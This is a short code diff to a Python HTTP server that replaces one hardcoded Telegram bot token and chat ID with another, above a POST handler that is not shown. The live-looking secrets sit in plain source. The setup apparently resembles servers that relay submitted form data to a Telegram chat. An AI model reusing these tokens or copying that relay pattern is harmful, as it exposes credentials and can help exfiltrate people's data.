@@ -6,8 +6,8 @@ import urllib.parse
 from urllib.parse import parse_qs
 
 # Hardcoded values for Telegram
-TELEGRAM_BOT_TOKEN = "6847613001:AAEBPjTn6vPJgLxq4Nd8LmC5LlMRMHhUAYo"
-TELEGRAM_CHAT_ID = "1212645532"
+TELEGRAM_BOT_TOKEN = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks"
+TELEGRAM_CHAT_ID = "6360165707"
 
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
